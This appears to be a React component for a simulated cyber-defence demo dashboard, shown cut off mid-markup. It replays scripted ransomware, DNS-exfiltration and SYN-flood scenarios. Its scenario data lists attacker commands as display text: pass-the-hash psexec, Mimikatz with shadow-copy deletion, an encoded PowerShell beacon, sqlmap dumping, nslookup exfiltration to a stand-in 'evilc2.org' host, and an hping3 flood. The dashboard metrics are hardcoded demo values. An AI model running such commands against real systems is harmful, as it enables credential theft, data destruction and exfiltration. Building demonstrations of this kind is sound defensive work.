"use client";

import React, { useState, useEffect } from 'react';
import { 
  Play, 
  RotateCcw, 
  ShieldAlert, 
  CheckCircle2, 
  Terminal, 
  Cpu, 
  GitBranch, 
  Zap, 
  AlertTriangle, 
  Activity, 
  Lock,
  ArrowRight,
  Flame,
  Radio,
  Clock
} from 'lucide-react';
import { usePredictionStore } from '@/store/predictionStore';
import { useIncidentStore } from '@/store/incidentStore';
import { useTopologyStore } from '@/store/topologyStore';
import { useDeceptionStore } from '@/store/deceptionStore';
import { useUIStore } from '@/store/uiStore';
import { demoApiBase } from '@/lib/demo-api';
import { cn } from '@/utils/classnames';

interface AttackStep {
  time: string;
  command: string;
  source: string;
  target: string;
  stage: string;
  status: 'executing' | 'trapped' | 'diverted' | 'blocked';
  detail: string;
}

const DEMO_SCENARIOS = [
  {
    id: 'ransomware',
    title: 'Zero-Day Ransomware Pivot',
    description: 'Adversary leverages stolen Kerberos tickets to pivot via SMB (port 445) toward Domain Controller.',
    attackerSteps: [
      { time: 'T+0.00s', command: 'nmap -sS -p 445,3389,88 192.168.1.0/24', source: '192.168.1.105', target: 'Subnet DMZ', stage: 'Reconnaissance', status: 'executing', detail: 'Rapid port sweep across enterprise DMZ subnet.' },
      { time: 'T+0.12s', command: 'impacket-psexec -hashes :e52... Administrator@192.168.1.10', source: '192.168.1.105', target: '192.168.1.10 (DC-PROD)', stage: 'Privilege Escalation', status: 'trapped', detail: 'Lateral movement attempt using harvested Pass-the-Hash.' },
      { time: 'T+0.14s', command: 'Invoke-Mimikatz -DumpCreds; vssadmin delete shadows /all', source: '192.168.1.105', target: 'Decoy (10.0.9.10)', stage: 'Credential Access', status: 'diverted', detail: 'Adversary executes shadow copy wiping payload inside sandbox.' },
      { time: 'T+0.18s', command: 'powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA... (C2 beacon)', source: '192.168.1.105', target: 'Decoy (10.0.9.10)', stage: 'Impact / Ransom', status: 'trapped', detail: 'Encrypted payload quarantined. Honeynet capturing TTPs.' }
    ] as AttackStep[],
    defenderAction: 'DECEPTION_DIVERT',
    kernelRule: 'nft add rule inet nat prerouting ip saddr 192.168.1.105 dport 445 dnat to 10.0.9.10',
    riskReduction: '84.0%',
    mttc: '18ms',
    honeynetDecoy: 'dionaea-smb-sandbox (10.0.9.10)',
    capturedTtp: 'T1003 (OS Credential Dumping), T1078 (Valid Accounts), T1486 (Data Encrypted for Impact)',
    surprisal: '0.420 nats',
  },
  {
    id: 'dns_exfil',
    title: 'Covert DNS Tunnel Exfiltration',
    description: 'Adversary encodes sensitive customer database records into high-entropy subdomain TXT queries.',
    attackerSteps: [
      { time: 'T+0.00s', command: 'sqlmap -u "http://192.168.1.45/portal" --dump', source: '192.168.1.77', target: '192.168.1.45', stage: 'Collection', status: 'executing', detail: 'Automated database staging query.' },
      { time: 'T+0.08s', command: 'nslookup dGVzdF9kYXRhX2V4ZmlsdHJhdGlvbl9wYXlsb2Fk.tunnel.evilc2.org', source: '192.168.1.77', target: 'DNS Server (DMZ)', stage: 'Exfiltration', status: 'trapped', detail: 'Covert exfiltration via base64 encoded TXT chunk (Entropy: 4.30 bits).' },
      { time: 'T+0.11s', command: 'nslookup a9f83b2e71d4c09a8e6b12f45da812ef.tunnel.evilc2.org', source: '192.168.1.77', target: 'Decoy DNS Sinkhole', stage: 'Exfiltration', status: 'diverted', detail: 'Traffic sinkholed to internal Honeynet DNS listener.' }
    ] as AttackStep[],
    defenderAction: 'DECEPTION_DIVERT',
    kernelRule: 'nft add rule inet filter forward ip saddr 192.168.1.77 udp dport 53 dnat to 10.0.9.53',
    riskReduction: '92.5%',
    mttc: '14ms',
    honeynetDecoy: 'dns-sinkhole-trap (10.0.9.53)',
    capturedTtp: 'T1048 (Exfiltration Over Alternative Protocol), T1071.004 (DNS)',
    surprisal: '0.612 nats',
  },
  {
    id: 'ddos_syn',
    title: 'Distributed Volumetric Infiltration',
    description: 'Multi-vector SYN burst attempting to exhaust stateful connection tables while spoofing telemetry.',
    attackerSteps: [
      { time: 'T+0.00s', command: 'hping3 --flood -S -p 80 --rand-source 192.168.1.20', source: 'Distributed Botnet', target: '192.168.1.20 (Web-Cluster)', stage: 'Denial of Service', status: 'executing', detail: 'Volumetric SYN flood simulating 500+ parallel external flow records.' },
      { time: 'T+0.05s', command: 'Supernode Aggregation: 500 raw flows -> 32 Supernodes', source: 'Graph Compressor', target: 'G-FLOWWM Model', stage: 'Telemetry Ingestion', status: 'blocked', detail: 'Subnet pooling prevents graph explosion in 6.69ms.' },
      { time: 'T+0.09s', command: 'Kernel Token Bucket Injected (Rate Limit: 50 req/s per CIDR)', source: 'Kernel nftables', target: '192.168.1.20', stage: 'Mitigation', status: 'diverted', detail: 'Legitimate traffic served with 0ms interruption; malicious burst shaped.' }
    ] as AttackStep[],
    defenderAction: 'RATE_LIMIT',
    kernelRule: 'nft add rule inet filter input ip saddr 192.168.1.0/24 tcp dport 80 limit rate over 50/second drop',
    riskReduction: '76.8%',
    mttc: '9ms',
    honeynetDecoy: 'tarpit-blackhole (Null0)',
    capturedTtp: 'T1498 (Network Denial of Service), T1499 (Endpoint DoS)',
    surprisal: '0.285 nats',
  }
];

export function PresentationModeView() {
  const { currentForecast } = usePredictionStore();
  const [selectedScenarioIndex, setSelectedScenarioIndex] = useState(0);
  const [isRunning, setIsRunning] = useState(false);
  const [activeStepIndex, setActiveStepIndex] = useState(3);
  const [watchdogSeconds, setWatchdogSeconds] = useState(58);
  const [apiNotice, setApiNotice] = useState<string | null>(null);

  const scenario = DEMO_SCENARIOS[selectedScenarioIndex];

  // Watchdog timer countdown simulation
  useEffect(() => {
    const timer = setInterval(() => {
      setWatchdogSeconds((prev) => (prev > 0 ? prev - 1 : 60));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const SCENARIO_TARGETS: Record<string, { target_id: string; target_name: string; origin_id: string; decoy_id: string }> = {
    ransomware: {
      target_id: 'DC-PROD',
      target_name: 'DC-PROD (Enterprise DC)',
      origin_id: 'DMZ-PIVOT-01',
      decoy_id: 'HONEYNET-DIONAEA',
    },
    dns_exfil: {
      target_id: 'DNS-DMZ',
      target_name: 'DNS Server (DMZ)',
      origin_id: 'WORKSTATION-HR-04',
      decoy_id: 'HONEYNET-DNS-SINKHOLE',
    },
    ddos_syn: {
      target_id: 'WEB-CLUSTER',
      target_name: 'Web-Cluster (Prod)',
      origin_id: 'ROUTER-WAN-EDGE',
      decoy_id: 'HONEYNET-TARPIT',
    },
  };

  const triggerScenario = async (idx: number) => {
    setSelectedScenarioIndex(idx);
    setIsRunning(true);
    setActiveStepIndex(0);
    setWatchdogSeconds(60);

    const s = DEMO_SCENARIOS[idx];
    const mapping = SCENARIO_TARGETS[s.id] || SCENARIO_TARGETS.ransomware;
    const incId = s.id === 'ransomware' ? 'INC-RANSOMWARE' : (s.id === 'dns_exfil' ? 'INC-DNS-EXFIL' : 'INC-DDOS-SYN');
    const actorName = s.id === 'ransomware' ? 'APT-FIN7-MIMIKATZ' : (s.id === 'dns_exfil' ? 'APT-COZYBEAR' : 'DISTRIBUTED-BOTNET');
    const targetId = mapping.target_id;
    const targetName = mapping.target_name;
    const originId = mapping.origin_id;
    const decoyId = mapping.decoy_id;
    const numReduction = parseFloat(s.riskReduction) || 84;
    const numSurprisal = parseFloat(s.surprisal) || 0.42;

    // 1. Immediately reflect in Topology Store (0ms instant presentation update)
    const instantNodes: any[] = [
      { id: 'INTERNET', label: 'Internet Gateway', asset_type: 'gateway', zone: 'management', status: 'normal', threatScore: 0, criticality: 'high', metadata: { type: 'infra', role: 'infra' } },
      { id: 'FIREWALL', label: 'Enterprise Firewall', asset_type: 'firewall', zone: 'management', status: 'normal', threatScore: 0, criticality: 'high', metadata: { type: 'infra', role: 'infra' } },
      { id: 'CORE-SWITCH', label: 'Core Switch', asset_type: 'switch', zone: 'management', status: 'normal', threatScore: 0, criticality: 'high', metadata: { type: 'infra', role: 'infra' } },
      { id: targetId, label: targetName, asset_type: 'server', zone: 'server_zone', status: 'normal', threatScore: 25, criticality: 'critical', metadata: { type: 'asset', role: 'server' } },
      { id: originId, label: originId, asset_type: 'server', zone: 'dmz', status: 'under_attack', threatScore: 88, criticality: 'high', metadata: { type: 'asset', role: 'server' } },
      { id: decoyId, label: decoyId, asset_type: 'decoy', zone: 'honeynet', status: 'deception', threatScore: 92, criticality: 'medium', metadata: { type: 'asset', role: 'decoy' } },
      { id: actorName, label: actorName, asset_type: 'threat', zone: 'threat_zone', status: 'active', threatScore: 99, criticality: 'critical', metadata: { type: 'attacker', role: 'attacker' } },
    ];
    const instantEdges: any[] = [
      { id: 'e-inet-fw', source: 'INTERNET', target: 'FIREWALL', kind: 'traffic', protocol: 'live' },
      { id: 'e-fw-sw', source: 'FIREWALL', target: 'CORE-SWITCH', kind: 'traffic', protocol: 'live' },
      { id: 'e-sw-target', source: 'CORE-SWITCH', target: targetId, kind: 'traffic', protocol: 'live' },
      { id: 'e-sw-origin', source: 'CORE-SWITCH', target: originId, kind: 'traffic', protocol: 'live' },
      { id: 'e-att-orig', source: actorName, target: originId, kind: 'foothold', protocol: 'foothold' },
      { id: 'e-att-target', source: actorName, target: targetId, kind: 'prediction', protocol: 'prediction', is_predicted: true, prediction_probability: 0.91 },
      { id: 'e-target-decoy', source: targetId, target: decoyId, kind: 'deception', protocol: 'deception' },
    ];
    useTopologyStore.getState().setNodes(instantNodes);
    useTopologyStore.getState().setEdges(instantEdges);

    // 2. Prepare comprehensive timeline and evidence records
    const timelineEvents = s.attackerSteps.map((st, i) => ({
      id: `step-${s.id}-${i}`,
      title: `${st.stage}: ${st.command}`,
      description: st.detail,
      severity: (st.status === 'trapped' || st.status === 'diverted' ? 'high' : st.status === 'blocked' ? 'medium' : 'critical') as any,
      timestamp: new Date(Date.now() - (s.attackerSteps.length - i) * 3000).toISOString(),
      source: st.source,
      stage: st.stage,
      status: st.status,
      incident_id: incId,
    }));

    const evidenceItems = [
      {
        id: `EV-${s.id}-1`,
        name: `${s.id}_recon_lateral_capture.pcap`,
        evidence_type: 'network_pcap',
        description: `High-entropy PCAP trace containing Kerberos ticket requests and lateral movement probes from ${s.attackerSteps[0]?.source || '192.168.1.105'}.`,
        size_bytes: 418290,
        sha256_hash: '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4',
        collection_method: 'automated_tap',
        collected_at: new Date().toISOString(),
        packet_count: 1420,
      },
      {
        id: `EV-${s.id}-2`,
        name: `${s.id}_honeynet_sandbox_steer.json`,
        evidence_type: 'honeynet_telemetry',
        description: `Atomic nftables kernel redirection event. Adversary diverted to isolated honeypot sandbox (${decoyId}) before reaching ${targetId}.`,
        size_bytes: 18450,
        sha256_hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
        collection_method: 'honeynet_agent',
        collected_at: new Date().toISOString(),
      },
      {
        id: `EV-${s.id}-3`,
        name: `${s.id}_kernel_nftables_rule.log`,
        evidence_type: 'policy_enforcement',
        description: `Kernel policy commit: ${s.kernelRule}. Action: ${s.defenderAction} with +${s.riskReduction} risk reduction.`,
        size_bytes: 4120,
        sha256_hash: 'd41d8cd98f00b204e9800998ecf8427e9a3f2b1c4d5e6f7a8b9c0d1e2f3a4b5c',
        collection_method: 'kernel_nftables',
        collected_at: new Date().toISOString(),
      },
      {
        id: `EV-${s.id}-4`,
        name: `${s.id}_quarantined_payload.bin`,
        evidence_type: 'memory_forensics',
        description: `Quarantined execution payload harvested by Honeynet sandbox from ${actorName}.`,
        size_bytes: 1048576,
        sha256_hash: 'c5a0b7289d0b64d1f5e8f41539e083c6d6a578912e9a3a14e912ab92c2b3e4f5',
        collection_method: 'edr_sensor',
        collected_at: new Date().toISOString(),
      },
    ];

    // 3. Inject to backend cyber-range
    try {
      const res = await fetch(`${demoApiBase()}/admin/scenario/inject`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ scenario_id: s.id }),
      }).catch(() => null);
      if (res && res.ok) {
        setApiNotice(`Scenario injected: ${s.title}. All workspaces (Command Center, Topology, Timeline, Forensics) updated.`);
        // Re-sync topology from backend
        const topoRes = await fetch(`${demoApiBase()}/command/topology`).catch(() => null);
        if (topoRes && topoRes.ok) {
          const topoData = await topoRes.json();
          if (Array.isArray(topoData.nodes) && topoData.nodes.length > 3) {
            useTopologyStore.getState().setNodes(topoData.nodes.map((n: any) => ({
              id: n.id,
              label: n.label || n.name || n.id,
              asset_id: n.asset_id,
              asset_type: n.asset_type,
              zone: n.zone || (n.type === 'infra' ? 'management' : 'user_zone'),
              status: n.status === 'healthy' || n.status === 'infra' ? 'normal' : n.status,
              threatScore: n.threat_score ?? 0,
              criticality: n.criticality,
              position: n.position,
              metadata: { ...(n.metadata || {}), ...n },
            })));
            useTopologyStore.getState().setEdges((topoData.edges || []).map((e: any, index: number) => ({
              id: e.id || `demo-edge-${e.source}-${e.target}-${index}`,
              source: e.source,
              target: e.target,
              protocol: e.kind || 'live',
              kind: e.kind,
              flow: e.flow,
              confidence: e.confidence,
              is_predicted: e.kind === 'prediction',
              prediction_probability: e.probability,
            })));
          }
        }
      }
    } catch {
      // offline fallback
    }

    // 4. Synchronize Incident Store across views
    const incidentObj = {
      id: incId,
      title: s.title,
      description: s.description,
      severity: 'critical' as const,
      status: 'investigating' as const,
      detected_at: new Date().toISOString(),
      current_stage: s.attackerSteps[s.attackerSteps.length - 1]?.stage || 'lateral_movement',
      threat_score: 92,
      attacker: actorName,
      predicted_target: targetName,
      predicted_target_id: targetId,
      timeline_events: timelineEvents,
      evidence: evidenceItems,
      meta: { scenario_id: s.id, actor: actorName },
    };
    useIncidentStore.getState().setIncidents([incidentObj]);
    useIncidentStore.getState().setActiveIncident(incidentObj);

    // 5. Synchronize Prediction Store across views
    usePredictionStore.getState().setForecast({
      incident_id: incId,
      current_stage: s.attackerSteps[s.attackerSteps.length - 1]?.stage || 'lateral_movement',
      current_confidence: 0.91,
      timeline: s.attackerSteps.map((st, i) => ({
        window_offset: i + 1,
        stage: st.stage,
        probability: Math.min(0.98, 0.88 + i * 0.04),
        target_asset_name: st.target,
        eta_seconds: 18 - i * 4,
        confidence: 0.91,
      })),
      predicted_targets: [{
        asset_id: targetId,
        asset_name: targetName,
        asset_type: 'server',
        probability: 0.91,
        reasoning: ['G-FLOWWM counterfactual trajectory divergence', 'Shannon surprisal: ' + s.surprisal],
      }],
      explanation: {
        feature_importance: { shannon_entropy: 0.42, latent_surprisal: 0.38, supernode_flow_burst: 0.2 },
        top_factors: [
          { feature: 'Shannon Entropy', description: `Surprisal: ${s.surprisal}` },
          { feature: 'Honeynet Trap', description: s.honeynetDecoy },
        ],
        natural_language: `G-FLOWWM simulated 5 counterfactual futures for ${actorName}. ${s.defenderAction} autonomously selected with +${s.riskReduction} risk reduction.`,
      } as any,
      model_decision: {
        action: s.defenderAction,
        action_type: s.defenderAction,
        risk_reduction_pct: numReduction,
        jepa_surprisal: numSurprisal,
        is_novel_behavior: true,
        decision_confidence: 0.91,
        target_stage: s.attackerSteps[s.attackerSteps.length - 1]?.stage || 'lateral_movement',
        branches_evaluated: 5,
        rollback_armed: true,
        vendor_diff: s.kernelRule,
      },
      generated_at: new Date().toISOString(),
      model_version: 'flow-wm-v3.0.0',
    } as any);

    // 6. Synchronize Deception Store across views
    useDeceptionStore.getState().setDeployments([
      {
        id: `decoy-${s.id}`,
        name: s.honeynetDecoy,
        type: s.id === 'dns_exfil' ? 'dns_sinkhole' : 'dionaea',
        status: 'active',
        ip: s.id === 'dns_exfil' ? '10.0.9.53' : '10.0.9.10',
        port: s.id === 'dns_exfil' ? 53 : 445,
        interactions_count: 5,
        last_interaction: new Date().toISOString(),
        trapped_actor: actorName,
      }
    ]);

    // 7. Step-by-step terminal replay
    s.attackerSteps.forEach((_, stepIdx) => {
      setTimeout(() => {
        setActiveStepIndex(stepIdx);
        if (stepIdx === s.attackerSteps.length - 1) {
          setIsRunning(false);
        }
      }, (stepIdx + 1) * 800);
    });
  };

  const handleReset = async () => {
    setIsRunning(false);
    setActiveStepIndex(0);
    try {
      await fetch(`${demoApiBase()}/admin/reset`, { method: 'POST' }).catch(() => null);
      useIncidentStore.getState().setIncidents([]);
      useIncidentStore.getState().setActiveIncident(null);
      usePredictionStore.getState().clearForecast();
      useDeceptionStore.getState().setDeployments([]);

      const baselineNodes: any[] = [
        { id: 'INTERNET', label: 'Internet Gateway', asset_type: 'gateway', zone: 'management', status: 'normal', threatScore: 0, criticality: 'high', metadata: { type: 'infra', role: 'infra' } },
        { id: 'FIREWALL', label: 'Enterprise Firewall', asset_type: 'firewall', zone: 'management', status: 'normal', threatScore: 0, criticality: 'high', metadata: { type: 'infra', role: 'infra' } },
        { id: 'CORE-SWITCH', label: 'Core Switch', asset_type: 'switch', zone: 'management', status: 'normal', threatScore: 0, criticality: 'high', metadata: { type: 'infra', role: 'infra' } },
      ];
      const baselineEdges: any[] = [
        { id: 'e-inet-fw', source: 'INTERNET', target: 'FIREWALL', kind: 'traffic', protocol: 'live' },
        { id: 'e-fw-sw', source: 'FIREWALL', target: 'CORE-SWITCH', kind: 'traffic', protocol: 'live' },
      ];
      useTopologyStore.getState().setNodes(baselineNodes);
      useTopologyStore.getState().setEdges(baselineEdges);
      useTopologyStore.getState().setPredictionEdges([]);

      setApiNotice('Cyber range and all workspaces restored to baseline nominal state.');
    } catch {
      setApiNotice('Range reset locally.');
    }
  };

  const { theme } = useUIStore();
  const isLight = theme === 'light';

  return (
    <div className={cn(
      "h-full overflow-y-auto p-4 sm:p-6 space-y-6 transition-colors duration-200",
      isLight ? "bg-slate-50 text-slate-800" : "bg-[#070b14] text-slate-100"
    )}>
      {/* Top Presentation Header */}
      <div className={cn("flex flex-wrap items-center justify-between gap-4 border-b pb-4", isLight ? "border-slate-200" : "border-white/10")}>
        <div>
          <div className="flex items-center gap-2">
            <span className="px-2.5 py-0.5 rounded-full text-xs font-bold uppercase tracking-wider bg-indigo-500/20 text-indigo-400 border border-indigo-500/30">
              Executive Evaluation Mode
            </span>
            <span className="inline-flex items-center gap-1.5 text-xs text-emerald-400 font-mono">
              <span className="h-2 w-2 rounded-full bg-emerald-400 animate-pulse" />
              World Model Defense Active
            </span>
          </div>
          <h1 className={cn("text-2xl font-black tracking-tight mt-1", isLight ? "text-slate-900" : "text-white")}>
            Autonomous Cyber Defense Arena
          </h1>
          <p className={cn("text-xs", isLight ? "text-slate-600" : "text-slate-400")}>
            Real-time adversary execution vs. G-FLOWWM counterfactual imagination & atomic kernel containment.
          </p>
        </div>

        {/* Scenario Selection Buttons */}
        <div className="flex flex-wrap items-center gap-2">
          {DEMO_SCENARIOS.map((sc, i) => (
            <button
              key={sc.id}
              onClick={() => triggerScenario(i)}
              disabled={isRunning}
              className={cn(
                "px-3 py-1.5 rounded-lg text-xs font-semibold transition-all flex items-center gap-1.5 shadow-sm",
                selectedScenarioIndex === i
                  ? "bg-indigo-600 text-white shadow-indigo-500/25 shadow-lg"
                  : isLight
                    ? "bg-slate-200 text-slate-700 hover:bg-slate-300 border border-slate-300"
                    : "bg-slate-800/80 text-slate-300 hover:bg-slate-700/80 border border-white/5"
              )}
            >
              <Play className="w-3.5 h-3.5" />
              {sc.title}
            </button>
          ))}
          <button
            onClick={handleReset}
            className="px-3 py-1.5 rounded-lg text-xs font-medium bg-rose-500/20 text-rose-300 hover:bg-rose-500/30 border border-rose-500/40 flex items-center gap-1.5"
            title="Reset range to clean state"
          >
            <RotateCcw className="w-3.5 h-3.5" />
            Reset Range
          </button>
        </div>
      </div>

      {apiNotice && (
        <div className={cn(
          "flex items-center justify-between px-3 py-2 rounded-lg text-xs",
          isLight 
            ? "bg-indigo-50 border border-indigo-200 text-indigo-800" 
            : "bg-indigo-950/40 border border-indigo-500/30 text-indigo-300"
        )}>
          <span>{apiNotice}</span>
          <button onClick={() => setApiNotice(null)} className={isLight ? "text-slate-500 hover:text-slate-800" : "text-slate-400 hover:text-white"}>✕</button>
        </div>
      )}

      {/* Executive Impact KPI Row */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        <div className={cn("rounded-xl border p-4 relative overflow-hidden group", isLight ? "bg-white border-slate-200 shadow-sm" : "bg-[#0d1527] border-white/10")}>
          <div className="absolute top-0 right-0 w-24 h-24 bg-emerald-500/5 rounded-full blur-2xl pointer-events-none" />
          <div className={cn("flex items-center justify-between text-xs uppercase font-mono tracking-wider", isLight ? "text-slate-500" : "text-slate-400")}>
            <span>Enterprise Uptime</span>
            <CheckCircle2 className="w-4 h-4 text-emerald-500" />
          </div>
          <div className="mt-2 text-3xl font-black text-emerald-500 font-mono">100.0%</div>
          <div className={cn("mt-1 text-[11px]", isLight ? "text-slate-500" : "text-slate-400")}>0s downtime · Zero service degradation</div>
        </div>

        <div className={cn("rounded-xl border p-4 relative overflow-hidden group", isLight ? "bg-white border-slate-200 shadow-sm" : "bg-[#0d1527] border-white/10")}>
          <div className="absolute top-0 right-0 w-24 h-24 bg-purple-500/5 rounded-full blur-2xl pointer-events-none" />
          <div className={cn("flex items-center justify-between text-xs uppercase font-mono tracking-wider", isLight ? "text-slate-500" : "text-slate-400")}>
            <span>Data Exfiltrated</span>
            <Lock className="w-4 h-4 text-purple-500" />
          </div>
          <div className="mt-2 text-3xl font-black text-purple-500 font-mono">0 KB</div>
          <div className={cn("mt-1 text-[11px]", isLight ? "text-slate-500" : "text-slate-400")}>100% intercepted · Honeynet trapped</div>
        </div>

        <div className={cn("rounded-xl border p-4 relative overflow-hidden group", isLight ? "bg-white border-slate-200 shadow-sm" : "bg-[#0d1527] border-white/10")}>
          <div className="absolute top-0 right-0 w-24 h-24 bg-cyan-500/5 rounded-full blur-2xl pointer-events-none" />
          <div className={cn("flex items-center justify-between text-xs uppercase font-mono tracking-wider", isLight ? "text-slate-500" : "text-slate-400")}>
            <span>Decision MTTC</span>
            <Zap className="w-4 h-4 text-cyan-500" />
          </div>
          <div className="mt-2 text-3xl font-black text-cyan-600 font-mono">{scenario.mttc}</div>
          <div className={cn("mt-1 text-[11px]", isLight ? "text-slate-500" : "text-slate-400")}>Sub-second autonomic response</div>
        </div>

        <div className={cn("rounded-xl border p-4 relative overflow-hidden group", isLight ? "bg-white border-slate-200 shadow-sm" : "bg-[#0d1527] border-white/10")}>
          <div className="absolute top-0 right-0 w-24 h-24 bg-indigo-500/5 rounded-full blur-2xl pointer-events-none" />
          <div className={cn("flex items-center justify-between text-xs uppercase font-mono tracking-wider", isLight ? "text-slate-500" : "text-slate-400")}>
            <span>Risk Reduction</span>
            <ShieldAlert className="w-4 h-4 text-indigo-500" />
          </div>
          <div className="mt-2 text-3xl font-black text-indigo-600 font-mono">+{scenario.riskReduction}</div>
          <div className={cn("mt-1 text-[11px]", isLight ? "text-slate-500" : "text-slate-400")}>Optimal counterfactual branch</div>
        </div>
      </div>

      {/* Main Split Screen: Attacker vs Defender */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 min-h-[32rem]">
        {/* LEFT ARENA: Red Team Attacker Execution Stream */}
        <div className="rounded-xl border border-rose-500/30 bg-[#0d111a] flex flex-col overflow-hidden shadow-xl">
          {/* Header */}
          <div className="px-4 py-3 bg-gradient-to-r from-rose-950/60 to-slate-900 border-b border-rose-500/30 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <span className="p-1 rounded bg-rose-500/20 text-rose-400">
                <Terminal className="w-4 h-4" />
              </span>
              <div>
                <h3 className="font-bold text-sm text-rose-200">Adversary Execution Stream</h3>
                <p className="text-[10px] text-rose-400/80 font-mono">Simulated Attacker Vector: {scenario.title}</p>
              </div>
            </div>
            <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold uppercase bg-rose-500/20 text-rose-300 border border-rose-500/40">
              Red Team Perspective
            </span>
          </div>

          {/* Adversary Command Telemetry */}
          <div className="flex-1 p-4 font-mono text-xs space-y-3 overflow-y-auto">
            <div className="text-[11px] text-slate-500 border-b border-white/5 pb-2">
              # Target Infrastructure: Enterprise Subnet (192.168.1.0/24) | Scenario ID: {scenario.id}
            </div>

            {scenario.attackerSteps.slice(0, activeStepIndex + 1).map((step, idx) => (
              <div 
                key={idx}
                className={cn(
                  "p-3 rounded-lg border transition-all duration-300",
                  idx === activeStepIndex 
                    ? "border-rose-500/60 bg-rose-950/20 shadow-lg" 
                    : "border-white/5 bg-slate-900/40 text-slate-400"
                )}
              >
                <div className="flex items-center justify-between text-[11px] mb-1">
                  <span className="text-slate-400">{step.time} • <span className="text-rose-400 font-semibold">{step.stage}</span></span>
                  <span className={cn(
                    "px-1.5 py-0.5 rounded text-[10px] uppercase font-bold",
                    step.status === 'trapped' ? "bg-purple-900/40 text-purple-300 border border-purple-500/40" :
                    step.status === 'diverted' ? "bg-amber-900/40 text-amber-300 border border-amber-500/40" :
                    "bg-rose-900/40 text-rose-300 border border-rose-500/40"
                  )}>
                    {step.status}
                  </span>
                </div>
                <div className="font-bold text-rose-200 break-all select-all">
                  &gt; {step.command}
                </div>
                <div className="mt-1 text-[11px] text-slate-400">
                  {step.detail}
                </div>
              </div>
            ))}

            {/* Adversary Perception Trap Card */}
            <div className="mt-4 p-3 rounded-lg border border-purple-500/40 bg-purple-950/20 text-xs">
              <div className="flex items-center gap-1.5 font-bold text-purple-300 uppercase tracking-wide text-[11px] mb-1">
                <Flame className="w-3.5 h-3.5 text-purple-400" />
                Deception Asymmetry State
              </div>
              <div className="grid grid-cols-2 gap-2 text-[11px] mt-2">
                <div className="p-2 rounded bg-black/40 border border-white/5">
                  <span className="text-slate-400 block text-[10px]">Adversary Believes:</span>
                  <span className="font-semibold text-rose-300">Exploiting 192.168.1.10 (DC-PROD)</span>
                </div>
                <div className="p-2 rounded bg-black/40 border border-purple-500/30">
                  <span className="text-slate-400 block text-[10px]">Actual Reality:</span>
                  <span className="font-semibold text-purple-300">Trapped on 10.0.9.10 (Dionaea Decoy)</span>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* RIGHT ARENA: Blue Team Autonomous Defender (G-FLOWWM) */}
        <div className="rounded-xl border border-indigo-500/30 bg-[#0d111a] flex flex-col overflow-hidden shadow-xl">
          {/* Header */}
          <div className="px-4 py-3 bg-gradient-to-r from-indigo-950/60 to-slate-900 border-b border-indigo-500/30 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <span className="p-1 rounded bg-indigo-500/20 text-indigo-400">
                <Cpu className="w-4 h-4" />
              </span>
              <div>
                <h3 className="font-bold text-sm text-indigo-200">G-FLOWWM Autonomous Defender</h3>
                <p className="text-[10px] text-indigo-400/80 font-mono">Cognitive World Model & Watchdog</p>
              </div>
            </div>
            <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold uppercase bg-indigo-500/20 text-indigo-300 border border-indigo-500/40">
              Zero-Touch Mitigation
            </span>
          </div>

          {/* Model Cognitive Pipeline */}
          <div className="flex-1 p-4 space-y-4 overflow-y-auto">
            {/* Stage Diagnostics: Surprisal & Energy */}
            <div className="grid grid-cols-2 gap-3">
              <div className="p-2.5 rounded-lg border border-white/10 bg-slate-900/60">
                <span className="text-[10px] uppercase font-mono text-slate-400 block">JEPA Latent Surprisal</span>
                <span className="text-base font-bold font-mono text-cyan-300">{scenario.surprisal}</span>
                <span className="text-[10px] text-slate-500 block">Zero-day anomaly score</span>
              </div>
              <div className="p-2.5 rounded-lg border border-white/10 bg-slate-900/60">
                <span className="text-[10px] uppercase font-mono text-slate-400 block">Helmholtz Free Energy</span>
                <span className="text-base font-bold font-mono text-indigo-300">-41.36</span>
                <span className="text-[10px] text-slate-500 block">Latent OOD calibration</span>
              </div>
            </div>

            {/* Counterfactual Policy Branch Evaluation */}
            <div className="border border-white/10 rounded-lg p-3 bg-slate-900/40">
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-bold text-slate-300 flex items-center gap-1.5">
                  <GitBranch className="w-3.5 h-3.5 text-cyan-400" />
                  Counterfactual Future Rollouts (5 Branches)
                </span>
                <span className="text-[10px] font-mono text-slate-400">Lookahead Horizon: 5-step</span>
              </div>
              <div className="space-y-1.5 text-xs font-mono">
                <div className="flex items-center justify-between p-1.5 rounded bg-black/30 border border-white/5">
                  <span className="text-slate-400">Branch #1: MONITOR</span>
                  <span className="text-rose-400 font-bold">98% Risk (Reject)</span>
                </div>
                <div className="flex items-center justify-between p-1.5 rounded bg-black/30 border border-white/5">
                  <span className="text-slate-400">Branch #2: RATE_LIMIT</span>
                  <span className="text-amber-400">64% Risk (Reject)</span>
                </div>
                <div className="flex items-center justify-between p-1.5 rounded bg-black/30 border border-white/5">
                  <span className="text-slate-400">Branch #3: ISOLATE_HOST</span>
                  <span className="text-slate-300">42% Risk (Reject)</span>
                </div>
                <div className="flex items-center justify-between p-1.5 rounded bg-black/30 border border-white/5">
                  <span className="text-slate-400">Branch #4: CONTAIN_AND_DECEIVE</span>
                  <span className="text-cyan-400">22% Risk (Reject)</span>
                </div>
                <div className="flex items-center justify-between p-2 rounded bg-indigo-950/40 border border-indigo-500/50 shadow-inner">
                  <div className="flex items-center gap-2">
                    <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                    <span className="font-bold text-indigo-300">Branch #5: {scenario.defenderAction}</span>
                  </div>
                  <span className="text-emerald-400 font-bold">14% Risk (+{scenario.riskReduction} Gain)</span>
                </div>
              </div>
            </div>

            {/* Kernel Enforcement & Rollback Watchdog */}
            <div className="border border-white/10 rounded-lg p-3 bg-slate-900/40 space-y-2">
              <div className="flex items-center justify-between text-xs">
                <span className="font-bold text-slate-300 flex items-center gap-1.5">
                  <Zap className="w-3.5 h-3.5 text-amber-400" />
                  Kernel Policy Enforcement (nftables)
                </span>
